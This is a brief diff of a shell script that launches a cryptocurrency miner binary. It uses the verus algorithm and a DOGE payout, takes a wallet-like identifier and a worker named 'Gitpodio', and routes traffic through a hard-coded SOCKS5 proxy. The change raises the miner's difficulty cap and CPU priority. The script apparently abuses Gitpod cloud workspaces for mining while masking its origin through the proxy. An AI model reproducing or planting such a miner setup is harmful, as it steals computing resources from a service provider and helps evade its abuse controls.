@@ -8,4 +8,4 @@ B=D63YEMS8dCqnE71Mrp1StTTCX39b22PN1z
 C=Gitpodio
 D=socks5://72.221.172.203:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE -t 65
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE -t 65 --max-diff=700000 --cpu-priority 5
